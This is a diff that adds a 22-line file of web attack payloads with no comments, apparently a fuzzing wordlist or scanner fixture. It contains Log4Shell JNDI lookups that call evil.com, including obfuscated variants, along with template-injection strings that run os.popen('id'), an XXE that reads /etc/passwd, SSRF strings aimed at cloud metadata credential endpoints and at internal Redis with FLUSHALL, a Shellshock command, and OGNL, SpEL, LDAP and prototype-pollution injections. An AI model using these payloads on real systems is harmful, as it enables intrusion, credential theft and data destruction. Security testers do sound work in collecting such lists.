@@ -1,0 +1,22 @@
+${jndi:ldap://evil.com/a}
+${${lower:j}ndi:${lower:l}dap://evil.com/a}
+${${::-j}${::-n}${::-d}${::-i}:rmi://evil.com/x}
+{{7*7}}
+${7*7}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+<%= 7*7 %>
+#{7*7}
+<?php echo md5('probe'); ?>
+<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+gopher://127.0.0.1:6379/_FLUSHALL
+dict://127.0.0.1:11211/stat
+() { :; }; /bin/bash -c 'cat /etc/passwd'
+*)(uid=*))(|(uid=*
+<!--#exec cmd="ls" -->
+%{(#_='multipart/form-data').(#cmd='id')}
+${T(java.lang.Runtime).getRuntime().exec('id')}
+{"__proto__":{"isAdmin":true}}
+http://metadata.google.internal/computeMetadata/v1/
+{% import os %}{{ os.popen('id').read() }}
